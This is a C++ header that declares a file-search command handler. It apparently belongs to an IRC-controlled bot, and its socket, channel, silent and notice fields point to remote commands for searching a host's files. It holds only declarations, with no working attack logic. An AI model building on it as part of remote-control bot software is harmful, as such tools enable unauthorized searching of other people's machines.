#include "commands.h"
#include "message.h"
#include "irc.h"
#include "main.h"

#ifndef __FINDFILE__
#define __FINDFILE__

class CFindFile : public CCommandHandler
{

typedef struct FFIND
{
	SOCKET sock;
	CString chan;
	CString filename;
	CString dirname;
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} FFIND;

public:
	void Init();
	bool HandleCommand(CMessage *pMsg);
	command m_cmdFindFile;
};

unsigned int FindFile(SOCKET sock, char *chan, BOOL notice, char *filename, char *dirname, unsigned int numfound);
#endif